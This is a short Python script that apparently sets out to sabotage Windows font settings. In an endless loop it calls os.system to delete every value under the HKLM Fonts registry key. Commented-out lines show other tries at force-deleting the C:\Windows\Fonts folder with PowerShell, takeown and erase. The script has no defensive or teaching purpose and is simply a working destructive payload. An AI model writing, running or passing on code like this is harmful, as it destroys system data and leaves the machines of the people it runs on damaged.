__author__ = 'RetR0'

import os
import subprocess

path = "/Windows/Fonts"
a = 1

while a >= 0:
    #def run(self, cmd):
    #    completed = subprocess.run(["powershell", "Remove-Item -path c:\Windows\Fonts -recurse -Force", cmd], capture_output=True)
    #    return completed

    #os.system('powershell /c "Remove-Item -path c:\Windows\Fonts -recurse -force"')
    os.system('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
#    os.system('cmd /c "takeown /f c:\Windows\Fonts /r /d o"')
#    os.system('cmd /c "erase /S /Q c:\Windows\Fonts"')
